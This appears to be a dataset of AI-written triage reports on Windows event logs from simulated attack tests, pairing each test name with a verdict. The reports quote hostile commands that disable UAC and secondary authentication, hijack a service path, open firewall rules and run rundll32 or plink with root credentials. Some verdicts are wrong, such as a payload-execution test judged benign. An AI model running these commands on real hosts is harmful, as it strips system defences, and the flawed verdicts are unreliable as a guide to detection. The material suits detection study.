   - Routine updates are occurring for Microsoft Defender (EventID: 43, 44). These logs indicate legitimate security intelligence updates for the antivirus software. Nothing inherently suspicious is noted here.

2. **Security Log Entries:**
   - **EventID 4634, 4624, 4672:** These indicate logins and logoffs for the user `admin_test` using NTLM authentication (logon type 3 typically indicates a network logon). The account was granted several high-privilege rights such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. Such privileges are often standard for administrator accounts, but they are also associated with sensitive operations that could be malicious if unusually invoked.
   - **EventID 5379:** These relate to specific credential access operations typically not involving successful logons and result in failed credential reads (indicated by ReturnCode 3221226021). They involve the `MicrosoftAccount:user=02txoixylodcstop`. This suggests someone might be probing or verifying account credentials, warranting further scrutiny.

3. **Sysmon Log Entries:**
   - There are multiple instances indicating the execution of `conhost.exe`, `powershell.exe`, `cmd.exe`, `wevtutil.exe`, and processes associated with Microsoft .NET (`csc.exe`, `cvtres.exe`). These are involved in compiling a file named `calc.cs` to form `data.004.exe`, hinting at a possible suspicious or unauthorized compilation activity.
   - `powershell.exe`, a component of Windows PowerShell, is frequently misused for scripting and executing malicious payloads. There is mention of an unknown process and frequent executions of wevtutil.
   - Specifically, `cmd.exe` executed to compile code using `csc.exe`, and the resulting executable being directed to `Windows\Temp`, can be a concern if an unapproved activity on a CEO's system. This combination might relate to script-based attack methodologies (e.g., file-less malware).

4. **Windows PowerShell Log Entries:**
   - The PowerShell logs were not provided. However, the mentioned execution of PowerShell coupled with unknown steps (absence of corresponding PowerShell logs) increases the importance of this vector's activities due to its notoriety in exploit scenarios.

### Suspicious Elements Identified:
- **Privilege Escalation Indicators:** Elevation privileges granted to `admin_test`, possibly legitimate but warranting a rule-out of unnecessary privilege escalation.
- **Command and Scripting Actions:** Execution of `cmd.exe` with compilation activities unusual for regular user operations.
- **Failed Credential Access:** EventID 5379's continuous attempts to read credentials could imply targeted probing.

### Assessment:
Given the combination of administrative privileges, unexplained compilation and execution activities, and potential credential probes, there is a possibility of a targeted or misused access attempt on the CEO's machine.

### Conclusion: SUSPICIOUS

### Recommended Actions:
- **Investigate Privilege Escalations:** Double-check if the recorded administrative privileges and activities are authorized and align with standard operational requisites.
- **Code Compilation Analysis:** Confirm if the compilation of `calc.cs` into `data.004.exe` is legitimate. Analyze the source code if possible to ascertain its purpose.
- **Review PowerShell Activity:** If possible, extract and review PowerShell logs or any associated transcripts for unusual activities.
- **Credential Access Monitoring:** Explore if irregular credential access or brute force attempts have been ongoing or match existing patterns of credential theft attempts.
- **Enhance Monitoring and Access Controls:** Implement additional monitoring on the CEO's machine for further anomalies. Consider strengthening access controls if unauthorized activities are suspected.

A resolution cannot be unequivocally classified as MALICIOUS without confirming any unauthorized intents behind these events, emphasizing the need for further investigation."
Rundll32 with Ordinal Value,"Upon analyzing the provided logs for the Windows host, several activities stand out that require further attention to assess their nature fully:

1. **Suspicious Execution of PowerShell and Command-Line Utilities**: 
   - The Sysmon log shows that `powershell.exe` was executed by the user `SERVER002\admin_test` at `2024-10-26 16:34:49.999`. PowerShell execution is common but can be a vector for exploitation, especially if no justification exists for its use.
   - There is an entry indicating the execution of `rundll32.exe` with a suspicious command line: `""cmd.exe"" /c rundll32.exe ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\bin\AllTheThingsx64.dll"",#2""`. Rundll32 running a DLL from a temporary directory and especially using the command line makes it highly suspect for malicious activity, potentially indicative of a malicious payload or file execution.

2. **Sensitive Privileges Assigned and Activity**:
   - Several logs in the Security section (EventID 4672) show the assignment of privileges like `SeDebugPrivilege`, which could be exploited by attackers to manipulate system processes.
   - The same user `admin_test` has been seen to execute `whoami.exe` and `hostname.exe` following the PowerShell command, which could suggest probing or reconnaissance actions on the system.

3. **Anomalous User Logins**:
   - A user `admin_test` appears in multiple login and activity logs, indicating a successful login via NTLM from an external workstation (`DESKTOP-3HL5B2P`) using an IP address `192.168.0.102`. If this is not a usual administrative action, it could indicate suspicious lateral movement or unauthorized access.

4. **High Integrity Level and Various Process Executions**:
   - Processes associated with `admin_test` operate at a high integrity level, which, when combined with the sensitive privileges granted, increases the risk of potential system exploitation.
   - Multiple processes linked to Microsoft Edge updates observed in the logs are generally normal but may merit further verification if not scheduled.

Based on the logs provided, there is a considerable indication of potential compromise, especially considering the use of `rundll32.exe` to execute a suspicious DLL, along with the high-privileged operations by `admin_test`.

**Assessment**: The observations point to activity that is **MALICIOUS**. There is a strong likelihood of exploitation, given the combination of PowerShell, command-line utilities, privilege escalation, and suspicious external workstation access.

**Guidance**:
- Immediate isolation of the affected host (`Server002`) to prevent further spread or damage.
- Conduct a thorough forensic analysis on `Server002` to identify all execution paths and potential malicious payloads.
- Review network traffic logs for any data exfiltration attempts or lateral movements.
- Verify the legitimacy of `admin_test` access and the external workstation's intent.
- Implement enhanced monitoring on similar endpoints to detect anomalous behavior promptly.
- Initiate incident response protocols and conduct a detailed breach assessment."
ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"Upon analyzing the provided logs, several items of potential concern warrant attention:

1. **Use of `cmd.exe` and `plink.exe`:**
   - An instance of `cmd.exe` is executed with the following command line arguments: `""cmd.exe"" /c echo """" | ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\plink.exe"" ""file.local"" -ssh  -l ""root"" -pw ""pass"" -m ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.010\\src\\esx_community_supported.txt""`.
   - `plink.exe` is a command-line SSH client often used for automated tasks and can be leveraged by attackers to create remote connections, in this case, potentially with administrator privileges.
   - Usage of parameters `-l ""root""` and `-pw ""pass""` suggests an attempt to connect to a remote system as the root user with password authentication, which is suspicious and could potentially indicate unauthorized remote access.

2. **Execution Context:**
   - The user `SERVER002\\admin_test` appears frequently across multiple process executions, which include PowerShell, `wevtutil.exe`, and `conhost.exe` processes close together, suggesting possible script or batch execution.
   - Processes executed under this context show commands associated with investigative actions, such as running `hostname.exe` and `whoami.exe`, which are often used to gather system information, possibly indicative of post-exploitation reconnaissance.

3. **Unusual Parent-Child Relationships:**
   - Notably, many processes are spawned from `wsmprovhost.exe`, typically associated with Windows Remote Management. This might suggest remote execution of commands on the system using a higher-privileged account such as the admin_test.

4. **Use of High Integrity Level:**
   - The sessions in which these processes are running display ""High"" integrity levels, indicating that actions are being performed with elevated privileges.

5. **Lack of Expected Log Context:**
   - PowerShell logs and further context (such as command-line arguments) that might detail the specific purpose of these `cmd.exe` commands or PowerShell execution are missing, which adds a layer of opacity to this investigation.

**Assessment:**
Based on the presence of `plink.exe` with SSH access attempts as `root`, coupled with suspicious command-line arguments and the use of potentially legitimate administrative tools in proximity, there is enough evidence to categorize this activity as **SUSPICIOUS**. It is strongly indicative of potentially malicious behavior that merits further investigation, especially around unauthorized access and intended data exfiltration.

**Guidance for Further Action:**
- Immediately review and if necessary revoke access credentials for the user `admin_test`, particularly if not officially sanctioned for remote operations.
- Investigate the origin and purpose of the `plink.exe` file and associated scripts in the noted directories.
- Conduct a thorough audit of remote connections attempted or established from this system, focusing on possible unauthorized access paths indicated in the log.
- Review execution contexts and recent actions taken with tools like PowerShell that could provide further insight into anomalous activities.
- Enhance monitoring and consider deploying additional detection rules (e.g., EDR alerts) for similar suspicious use of known administrative tools.

Final Resolution: **SUSPICIOUS**"
Service ImagePath Change with reg.exe,"Upon analyzing the Windows event logs provided, several points of interest can be observed:

1. **Process Execution and Command-line Arguments**:
   - The Sysmon log records multiple instances of PowerShell, conhost.exe, and wevtutil.exe being launched around the same time. The frequent and simultaneous launching of command-line utilities without explicit commands indicated could denote script-based or automated activities.
   - A notable event in the Sysmon log involves the execution of `cmd.exe` with the command-line arguments `""/c reg.exe add \""HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\"" /f /v ImagePath /d \""%%windir%%\\system32\\cmd.exe\""""`. This command adds a registry entry that links `cmd.exe` to a service, potentially a mechanism for persistence or unauthorized task execution.
   - The presence of processes like `whoami.exe` and `hostname.exe` further indicates possible enumeration activity, which is commonly seen in reconnaissance stages of a compromise.

2. **Privilege Use and High Integrity Levels**:
   - All processes, including potentially suspicious ones, execute under the user SERVER002\\admin_test and at a high integrity level. This suggests that an account with administrative privileges is being utilized, which may highlight potential misuse or compromise of these credentials.

3. **Indicators of Persistent Mechanisms**:
   - The command to add a registry key (`reg.exe` command) that creates a new system service linked to a command-line executable is highly indicative of establishing persistence. Such operations are often conducted to maintain access to a compromised system.

4. **System Utilization**:
   - The use of authorized system files such as `wsmprovhost.exe`, `conhost.exe`, `wevtutil.exe`, and `powershell.exe` conveys the appearance of legitimate actions but can often mask malicious intentions, especially when chained together in quick succession.

**Assessment**:
The sequence and nature of these logged events suggest potentially cunning activity aimed at reconnaissance and establishing persistence:

- **Suspicious Activity**: The rapid launching of processes and tools often used in enumeration and lateral movement such as `wevtutil.exe` and `PowerShell`, along with registry modifications through `cmd.exe`, merit a thorough investigation.
- **Potential Compromised Account**: Given the administrative rights used prominently, the investigation should assess whether the credentials for SERVER002\\admin_test are sufficiently protected and if unauthorized access has occurred.

**Recommendation**:
- Isolate the affected machine to prevent potential further compromise or lateral movement.
- Review any scripts or scheduled tasks that might have triggered these events.
- Change administrative passwords and evaluate user credential security.
- Deepen threat hunting to uncover any additional malicious activities or configurations associated with this host or administrator account.

**Resolution**:
Given the observed activities and their implications, the decision is **SUSPICIOUS**. Further investigation is necessary to confirm malicious intent and understand the scope of these actions."
Microsoft.Workflow.Compiler.exe Payload Execution,"Upon reviewing the provided collection of Windows event logs, several aspects of activity on the system have been identified. Here's a detailed analysis:

### Key Observations:

1. **Microsoft Edge Update Events:**
   - Numerous entries related to `MicrosoftEdgeUpdate.exe` services and processes are observed. This includes regular update operations such as `/svc`, `/regsvc`, `/ua /installsource core`, and others typical for a legitimate update process.
   - These processes are executed with `NT AUTHORITY\SYSTEM` privileges which are expected for system update processes.

2. **PowerShell Activity:**
   - There are entries related to `powershell.exe` being executed to run a command involving `Microsoft.Workflow.Compiler.exe`. The presence of PowerShell indicates scripting or task automation.
   - The command includes paths in the temp folder and seems to involve a .NET component, which raises a slight flag due to potential misuse but without more details, it could also be legitimate scripting.

3. **WerFault Error Reporting:**
   - The application logs contain entries indicating an unhandled exception in `microsoft.workflow.compiler.exe` with `WerFault.exe` being triggered as part of the Windows Error Reporting service.
   - `System.IO.DirectoryNotFoundException` suggests that the process attempted to access or write to a directory that does not exist. While this indicates poor error handling or configuration, it doesn't necessarily imply malicious activity.

4. **Service and Privilege Logs:**
   - Security logs indicate standard system-level authentication and privilege allocation, including elevated token privileges for `SYSTEM`, which is standard for system services.
   - No evidence of unauthorized access or privilege escalation attempts is noted in the logs.

5. **Security Audit Logs:**
   - Several `EventID: 5379` entries relate to failed credential access likely due to incorrect or non-existent credentials in a Microsoft Account context. These logs alone are insufficient to raise significant concern without patterns of a potential brute-force attempt or unauthorized access.

6. **Unusual Use of Tools:**
   - Several instances of execution for known system tools like `wevtutil.exe`, `hostname.exe`, `whoami.exe` indicate potential auditing or querying activity but could also be part of application diagnostics or legitimate scripts executed by administrators.

- Based on the logs reviewed, the recurring updates on Microsoft Edge and the execution of .NET assemblies using PowerShell suggest typical system update and administrative scripting activities. There is no concrete evidence of exploitation, injection attacks, or unauthorized escalations.
- **Resolution: BENIGN**: The activities observed in the logs are consistent with system maintenance tasks and do not appear to involve malicious intent or compromise. However, it's advisable to ensure the legitimacy of any scripts executed by administrators and monitor any deviations from the norm.

### Recommendations:

- **Validation of PowerShell Scripts**: Verify the legitimacy of PowerShell scripts executing components like `Microsoft.Workflow.Compiler.exe` by checking script origins, purposes, and permissions.
- **Routine Monitoring**: Continue monitoring logs for anomalies such as unfamiliar IPs accessing the system, high privilege access not typically required, or abnormal process launch patterns.
- **System Updates**: Validate that all system updates, including those for Edge, are being sourced from trusted paths to prevent supply-chain attacks.

In conclusion, no immediate threat is present based on the current log data. Implement continued vigilance to ensure the security posture remains robust."
Activities To Disable Secondary Authentication Detected By Modified Registry Value,"**Analysis of Logs:**

1. **Event ID 4616 - Time Change Events**:  
    - Time change events logged by `svchost.exe` (`NewTime` is slightly earlier than `PreviousTime`). 
    - This could be harmless, often due to synchronization activities or benign system clock adjustments. 
    - Process IDs (`0x12BC`) and times indicate these changes are almost concurrent, typically suggesting system-level adjustments rather than manual tampering.

2. **Event ID 4672 - Special Privileges Assign**:
    - User `admin_test` was granted a large number of privileges (e.g., `SeSystemEnvironmentPrivilege`, `SeDebugPrivilege`, `SeImpersonatePrivilege`).
    - This is notable but not inherently malicious; however, it indicates the user has elevated permissions, which can be exploited.

3. **Event ID 4624 - Logon Event**:
    - Successful logon by `admin_test` using NTLM from an external IP (`192.168.0.102`).
    - Logon type `3` refers to a network logon, which is common for administrative tasks, but it’s crucial to confirm if the IP address is recognized and expected.

4. **Unusual Registry Modification**:
    - Use of the `cmd.exe` and `reg.exe` to modify `HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor`.
    - This registry edit disables secondary authentication factors, which significantly reduces security.
    - Initiated by `admin_test` from `cmd.exe` process with high integrity level. This suggests administrative intent or an automated script potentially altering security settings.

5. **Application/Kernel Events**:  
    - Regular system updates (`Microsoft Edge Update`) and kernel general events were identified, appearing routine.

**Threats or Risks Identified**:  
- The excessive and critical privileges assigned to `admin_test` combined with subsequent registry modification activities to disable secondary authentication are alarming.
- Potential misuse or compromise of privileged account, `admin_test`, needs verification.
- The external network logon could indicate potential lateral movement or unauthorized access if the IP is not recognized.

**Guidance and Resolution**:  
- Enquire and confirm if `admin_test` intended to disable the secondary authentication feature. Verification of the logged-in IP address against known addresses for organizational admins is necessary.
- Review logs for additional indicators of compromise related to account use.
- It would be prudent to temporarily increase monitoring on `admin_test` and see if any further security policies are changed.
- Consider revising security policies that govern priviledge assignments to administrators and enforce multi-factor authentication without exceptions.

**Resolution**: **SUSPICIOUS**  
The logs contain suspicious activity involving an administrative user with elevated privileges making a security-reducing registry change. Further investigation is needed to determine the legitimacy of these actions and ensure there is no ongoing compromise."

### Analysis of Logs

#### Windows PowerShell Log:

1. **Event Records (1043 - 1049):** The PowerShell events show that a PowerShell session was initiated with a command structure that attempts to execute `calc.exe` via `rundll32.exe` using `zipfldr.dll`. The use of `rundll32.exe` to execute commands is a technique often seen in malicious activities to execute payloads or bypass security filters. The Pattern observed is indicative of potential obfuscation or exploitation attempts:
   - Command executed: `powershell.exe & {rundll32.exe zipfldr.dll,RouteTheCall ""'%windir%\\System32\\calc.exe'""}`
2. **Execution Context:** The events are consistent with launching an executable (in this case, `calc.exe`) in a way that might be designed to avoid detection. While `calc.exe` itself is not malicious, the method used to execute it raises suspicion.

#### System Log:

- Viewed system logs indicate routine system operations, such as time changes managed by `svchost.exe`, without immediate indicators of malicious activity. Loading of time data from `time.windows.com` appears legitimate.

#### Application Log:

- The application log shows routine entries, such as service stops for software protection and EdgeUpdate. No immediate indicators of malicious activity are observed.

#### Security Log:

- **Event ID 4616:** The system time was changed. While this can be part of normal system operations, such changes can sometimes be used in timing attacks or to cover tracks in a compromise event.

#### Sysmon Log:

1. **Process Creation (Event Records):** Multiple instances of system utilities such as `conhost.exe`, `wevtutil.exe`, `whoami.exe`, and `PowerShell.exe` were spawned around the same time.
2. **Suspicious Execution:** An instance of `rundll32.exe` was used to execute a command, supporting findings from PowerShell log:
   - Process CommandLine: `""C:\\Windows\\system32\\rundll32.exe"" zipfldr.dll,RouteTheCall '%%windir%%\\System32\\calc.exe'`
3. **User Context:** These processes were executed under the user `SERVER002\\admin_test`, indicating that administrative privileges might have been leveraged or targeted.

### Assessment

Based on the deployed analysis:
- The combination of `rundll32.exe` specifically for executing an innocuous program like `calc.exe` and the method used is highly suspicious. While the `calc.exe` is typically benign, the execution approach tends towards a test or a step in a larger exploit chain seeking to hide or verify if execution techniques will be detected.
- If the full context of administrative actions is lacking or unexplained, this behavior might indicate an attempt at obfuscation or evasion common in unauthorized access scenarios.

### Resolution

**Resolution: SUSPICIOUS**

The activity involving `rundll32.exe` and PowerShell is **suspicious** and warrants further investigation. Additional data and context, such as network logs or user behavior justifications, should be examined. Review recent administrative activities and verify the legitimacy of any scripts or tasks run by the `admin_test` user. Immediately restrict and review access for `admin_test` to prevent potential exploitation, and consider threat hunting to identify any other unusual behavior on the network or hosts."
Mimic Ransomware - Allow Multiple RDP Sessions per User,"**Detailed Analysis of the Logs:**

1. **Unusual Process Execution:**
   - There are multiple executions of `wevtutil.exe`. This utility is used for Windows event log tasks, and while its presence isn't inherently malicious, frequent and repetitive launches can be suspicious if not tied to legitimate administrative activity. It is executed multiple times by the same user `SERVER002\admin_test`.

2. **Registry Modification:**
   - There is a `cmd.exe` process executing a command line operation to add a registry key `HKLM\System\CurrentControlSet\Control\Terminal Server` with a value `fSingleSessionPerUser` set to `0`. This modification allows multiple remote desktop sessions concurrently, which is a potential indicator of remote access tool configuration or policy bypass.

3. **Time Discrepancy Events:**
   - The system time appears to be manipulated intentionally, evidenced by events showing a past time set (`2024-10-24 16:56:11` from `2024-10-24 16:56:14`). Time manipulation can be a tactic to cover tracks or exploit time-sensitive operations.

4. **Process Activity:**
   - The use of legitimate Windows utilities like `powershell.exe`, `reg.exe`, and command-line tools (`cmd.exe`) can often be seen in malicious activity when used for lateral movement, persistence, or data exfiltration. The activities observed in these logs reflect execution from a high integrity level, indicating administrative privileges.

5. **Security Audit Logs:**
   - A login event (4624) shows an NTLM authentication which may suggest legitimate remote access. This might be benign if expected or part of a security test, but it does warrant further scrutiny given the other activities.

**Assessment of the Situation:**

Given the identified activities, there is sufficient evidence of:
- Potential misuse of administrator rights to change system configuration for remote access purposes.
- Time discrepancies indicating possible deliberate backdating to obscure changes or actions within the logs.

These factors, alongside abnormal use of system utilities like `wevtutil.exe` and registry modifications for remote access, strongly suggest actions consistent with initial malicious reconnaissance or compromise steps.

**Resolution:**

**SUSPICIOUS**

**Guidance on How to Proceed:**
- **Further Investigation:** Conduct in-depth forensic analysis into the changes made, particularly around the time changes and registry edits. Correlate with unauthorized access attempts or alerts from other monitoring tools (e.g., EDR, IPS).
- **Verify User Activity:** Investigate the user `SERVER002\admin_test` for unauthorized actions or roles within the organization, checking audit logs for unusual login patterns.
- **Review Remote Access Configurations:** Check RDP configurations and logs for unauthorized connections or modifications.
- **Increase Monitoring:** Implement tighter control and monitoring for users with elevated privileges, especially on high-risk systems.
- **Incident Response:** Depending on additional findings, initiate an incident response plan to mitigate any identified risks or breaches."
CheckIfInstallable method call,"After conducting a detailed analysis of the provided Windows event logs, several points of interest suggest potentially suspicious activity:

1. **PowerShell Activity**:
   - There are multiple Sysmon logs (EventID 1 and 5) related to the execution of `powershell.exe` with a rather complex and encoded command. The command includes importing a script from a temporary directory and executing activities associated with a custom DLL (data.004.dll) in the user's Temp directory. This activity is unusual and might indicate the use of PowerShell by an attacker to execute arbitrary code, a common technique used in attacks for exploitation or persistence.

2. **Creation of Custom Assemblies**:
   - PowerShell logs reveal the execution of `Add-Type` with references to 'System.Configuration.Install', which is suspicious given there is an attempt to generate a new assembly (`data.004.dll`) and write to a file at `C:\Users\admin_test\AppData\Local\Temp\tmp841A.tmp`. This pattern often suggests attempts to run a .NET assembly, which could be used to perform malicious actions.

3. **User Context and Integrity Levels**:
   - The operations run under the `SERVER002\admin_test` user context with a high integrity level. Combined with the aforementioned PowerShell activity, this raises concerns about potential privilege abuse.

4. **Frequent Use of `wevtutil.exe`**:
   - `wevtutil.exe` is a command-line tool used to manage event logs. Although its use may be benign, its frequent invocation within a short time interval could suggest log tampering or an attempt to cover tracks, common in malicious scenarios.

5. **C#.NET Compiler Invocation**:
   - The execution of `csc.exe` suggests dynamic compilation. While it can be benign, in context with other suspicious activities, this may be used to compile and execute C# code on the fly for malicious purposes.

6. **Other Common Tools Executed**:
   - The presence of multiple executions of common Windows binaries like `whoami.exe` and `hostname.exe` could indicate attempts by an attacker to gather information about the environment and user.

Given these observations, the logs contain multiple indicators of potentially malicious activity, particularly around the PowerShell execution and subsequent attempts to manage event logs and create custom .NET assemblies. 

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
- Further investigation is warranted to verify the legitimacy of the activities, specifically review the user actions and validate the `data.004.dll` file activities.
- Conduct a forensic analysis of the machine to look for additional indicators of compromise, such as persistence mechanisms and network connections.
- Check for any recent incidents reported by the user `SERVER002\admin_test` and determine if there are any authorized scripts that could explain these activities.
- Determine if there have been any unauthorized changes to system files or configurations.
- Review EDR alerts and logs for additional correlated activities.
- Consider isolating the machine until a thorough investigation is completed to prevent potential lateral movement or further compromise."
Allow SMB and RDP on Microsoft Defender Firewall,"Upon reviewing the provided event logs, here is the detailed analysis highlighting key observations:

### Observations:

1. **Process Execution Patterns**: 
   - Multiple executions of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test` are noted. While `conhost.exe` being a console window host process is not typically concerning, the frequent use of `wevtutil.exe`, which is used for managing event logs, especially by a user account such as `admin_test` may indicate attempts to manipulate or view event logs, potentially for covering tracks.

2. **Command Execution by `cmd.exe`**:
   - There is a command execution using `cmd.exe` with a command line setting firewall rules: `""cmd.exe"" /c netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes & netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes`. This type of command alters the system's network defenses to allow remote desktop connections, which could be indicative of an attacker enabling remote access.

3. **Integrity Level of the Process**:
   - The processes initiated by `SERVER002\admin_test`, such as `cmd.exe` and related subprocesses (`netsh.exe`), are running with a High integrity level, suggesting the user account holds administrative privileges.

4. **Firewall Rule Modification**:
   - The specific modification of firewall rules to enable remote desktop and file sharing can be a significant red flag indicating an attempt to establish or facilitate remote access to the system, commonly associated with malicious activity, especially if this was not an administrative action intended by the IT team.

5. **Usage of Standard Windows Tools**:
   - Tools like `hostname.exe`, `whoami.exe`, and others being run from `C:\Windows\System32\` under `SERVER002\admin_test` do not raise immediate concern independently. However, in combination with the other events, they could suggest a reconnaissance step in an attack chain.

6. **Time Setting Event**:
   - There are events related to time changes conducted by `svchost.exe` under the `LOCAL SERVICE` account. While the time being slightly adjusted by a service isn't unusual, combined with other indications of potentially malicious behavior, it can be monitored further.

7. **Routine Updates**:
   - There are numerous entries related to the Microsoft Edge Update process running under the `NT AUTHORITY\SYSTEM`. These appear to be routine operations and, based on the log, do not appear malicious.

### Assessment:

Given the patterns of execution seen in these logs, the execution of `netsh` commands to alter firewall settings enabling Remote Desktop and File Sharing, and the potential misuse of `wevtutil.exe`, there is a pattern that might indicate malicious behavior, specifically ensuring remote access setup and potential evasion through log manipulation.

### Guidance:

1. **Further Investigation**:
   - Review logs prior to and following these events to identify any potentially related sessions, especially to or from external IP addresses, or internal IPs not recognized.
   - Correlate this activity with user login attempts and network connection logs to see if there was unauthorized access.
   - Check for any alerts or logs indicating attempts to access the system from external networks.

2. **Immediate Actions**:
   - If the actions represented by these logs were not authorized administrative actions, consider disabling remote access for `SERVER002\admin_test`.
   - Review and tighten firewall rules, especially related to Remote Desktop and File Sharing services.
   - Review user privileges for `SERVER002\admin_test` and consider an audit of recent admin activities.

### Resolution: 

**MALICIOUS** - Logs indicate activity that is strongly indicative of malicious behavior, involving both potential evasion and unauthorized modifications to system security configurations."
attrib - Remove read-only attribute,"### Detailed Analysis of the Provided Windows Event Logs

#### Suspicious Activities:
1. **Command Execution via cmd.exe:**
   - Multiple instances of `cmd.exe` are observed executing with command lines that include conditional checks and file manipulation. For example, the command `cmd.exe /c IF EXIST %temp%\data.001_attrib ( EXIT 0 ) ELSE ( EXIT 1 )` checks for the existence of a specific directory or file and exits based on the condition. 
   - File operations involving `mkdir`, `echo`, and `attrib.exe` are repeatedly executed. These operations are used to create directories, write data to files, and modify file attributes, which can be routine or scripted, but seem unusual if automated or executed in quick succession without a clear business use case.
  
2. **Use of System Utilities:**
   - The frequent launching of system utilities such as `attrib.exe`, `whoami.exe`, and `hostname.exe` in scripts might suggest information gathering or a setup for persistence by malicious scripts.
   - Utilization of `wevtutil.exe` is spotted, which is typically involved in management of event logs. Tampering with event logs can be a tactic to cover tracks or create persistence.

3. **High Integrity Level Operations:**
   - Many processes are running with a high integrity level, indicating they could potentially perform privileged actions on the system, which increases the risk if these processes are malicious.

4. **Microsoft Edge Update Activity:**
   - There are multiple entries for `MicrosoftEdgeUpdate.exe` and related executables, which regularly occur on systems for browser updates. However, the creation of directories (`Microsoft\\Temp\\EUC579.tmp`) and multiple registry operations (e.g., `/regsvc`, `/regserver`) could potentially indicate misuse if these are not all verified as legitimate updates.

#### Context:
- **User Involvement:** All processes originate from a user `SERVER002\admin_test`, suggesting that actions were either directly performed by an admin user or a script executed under their credentials. While the usernames suggest a test or administrative account, the nature of rapid command executions can point towards automation which may or may not be sanctioned.

#### Assessment Resolution:
- **Determining Malicious Intent:** While the activities involve common Windows binaries and command-line actions that can be employed by both legitimate system operations and malware, the combination of obfuscated conditional scripting, interaction with event logs, and system-level tool usage raises a red flag.
- **File and System Modifications:** The creation, modification, and attribute changes of specific files, accompanied by changes in event logs, suggests a potential attempt at covering tracks which is a known malicious behavior.

### Conclusion: SUSPICIOUS
- There is enough activity that does not align directly with normal behavior of typical administrative tasks, especially if not corroborated with current operational requirements or software installations.
- **Recommendation for Further Action:**
  - Conduct a deeper investigation focusing on the purpose and timing of these operations, verify if these scripts should be running, and cross-check with known software deployments or updates.
  - Check the source of these scripts, examine the admin account's recent activities, and ensure there are no unauthorized accesses.
  - Isolate the machine if necessary and conduct a malware scan to ensure no compromise has occurred.

This assessment identifies potential suspicious activity but requires further investigation to ascertain intent and prevent any possible security risks."
Windows HideSCAVolume Group Policy Feature,"**Detailed Analysis:**

1. **System Log:**
   - The system log shows several events related to the Windows Time Service and Kernel General logs. The time is being adjusted slightly due to synchronization with NTP servers (e.g., `time.windows.com`). This behavior is normal for systems configured to synchronize time regularly, especially servers. There is no indication of any anomalies.

2. **Sysmon Log:**
   - Sysmon logs show execution of processes like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `reg.exe`, `whoami.exe`, and several Microsoft Edge Update processes.
   - **Potentially Suspicious Activity:** 
     - The execution of `cmd.exe` with a command line indicating a registry modification to hide the Windows 'Security and Maintenance' icon: 
       ```
       ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAVolume /t REG_DWORD /d 1 /f
       ```
       This registry change could potentially be part of unwanted configuration changes or an attempt to hide security-related notifications.

   - All Edge Update processes are executed by `NT AUTHORITY\SYSTEM`, which is typical for system services. The presence of these processes indicates a routine update operation with no apparent anomalies.

3. **Security Log:**
   - Event 4672 shows the granting of special privileges to `admin_test`. The privileges include `SeDebugPrivilege` and others typically required for administrative tasks. It's important to ensure that this type of access is justified for the `admin_test` user.
   - Event 4624 indicates a successful NTLM authentication logon for `admin_test`, which corresponds to the typical behavior of an admin user logging into a system.

4. **Application Log:**
   - Logs indicate the start and stop of the Edge Update service. These events are routine and expected during program updates.

**Assessment:**
   - The primary area of concern is the registry modification executed by `cmd.exe`. Modifying this specific registry key to hide security and maintenance notifications is unusual and could signal an attempt to diminish the visibility of system alerts to the user. The overall activity, especially when tied to an admin-level user performing actions, necessitates further investigation.

**Resolution:**
- **SUSPICIOUS:** The activity observed in the logs, particularly the registry modification, is suspicious and warrants further investigation. It would be advisable to check for any unauthorized changes to system configurations or the potential installation of unwanted software. Additionally, verifying the legitimacy of the `admin_test` actions and ensuring no unauthorized access or privilege escalation has occurred would be prudent. 

**Guidance on How to Proceed:**
- Examine the context around the registry change: Was the admin attempting a legitimate system configuration that aligns with business needs?
- Check the execution context and historical activity of the `admin_test` account to see if it aligns with expected patterns and permissions.
- Review security system logs for other indicators of compromise or policy violations.
- If the activity is deemed unauthorized, consider reverting the registry change, monitoring for additional suspicious activities, and potentially isolating the system for a more thorough investigation."
Disable UAC using reg.exe,"Based on the analysis of the provided logs, here are the key observations:

### Observations:

1. **Service Stopping:**
   - Entries in the Application log show the stopping of the ""edgeupdate"" service, which is associated with Microsoft Edge updates. This could be an expected behavior depending on whether updates were being applied or changes were being made to the system related to Edge.

2. **Time Sync Oddity:**
   - The System and Security logs show events indicating changes in system time. While time adjustments can occur due to synchronization with network time servers, it is worth considering the context of such changes to rule out manipulation related to cover-up activities.

3. **Frequent Execution of Edge Update Processes:**
   - Sysmon logs indicate numerous executions related to Microsoft Edge Update processes. While these processes can normally occur during legitimate update activities, the high frequency and density of these processes occurring within a short time span (less than a minute between multiple events) might be unusual for a standard update cycle.

4. **Suspicious Registry Modification:**
   - A significant indicator of potential malicious activity is the command-line execution observed in Sysmon logs: `cmd.exe /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f`. This command disables the User Account Control (UAC) on Windows, which is often a tactic used by attackers post-exploitation to facilitate further actions with elevated privileges without user prompts.

5. **Host and User Indication:**
   - Various logs show activities carried out by `SERVER002\admin_test` with elevated integrity levels, which needs to be considered in the context of administrative user behavior and whether such activity aligns with their typical duties.

### Assessment:

Given the unusual frequency of Edge update processes, modification to critical system registry settings to disable UAC, and time manipulation logs, these elements combined suggest potential suspicious or malicious activities that warrant further investigation.

### Resolution:

**SUSPICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Validate whether any legitimate administrative activities might have involved the disabling of UAC via command-line tools.
   - Cross-reference with business processes or scheduled tasks that might justify the high frequency of Edge-related processes.

2. **Further Investigation:**
   - Conduct deeper inspection of related system changes, potential unauthorized access or command executions, and connections from external IP addresses or unusual logons.
   - Review system images, hashes, and processes for signatures of known malicious activities.

3. **Security Enhancements:**
   - Ensure continuous monitoring of registry changes, especially those impacting system security settings, are in place with alerts set for unauthorized modifications.
